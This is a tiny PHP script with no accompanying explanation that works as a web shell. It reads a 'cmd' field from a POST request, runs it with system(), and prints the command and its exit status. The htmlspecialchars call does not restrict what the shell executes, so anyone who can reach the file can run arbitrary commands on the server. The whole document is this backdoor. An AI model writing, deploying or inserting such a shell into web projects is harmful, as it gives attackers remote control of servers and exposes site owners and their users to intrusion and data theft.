<?php
$run = htmlspecialchars($_POST['cmd']);
system($run,$var);
echo $run;
echo $var;
?>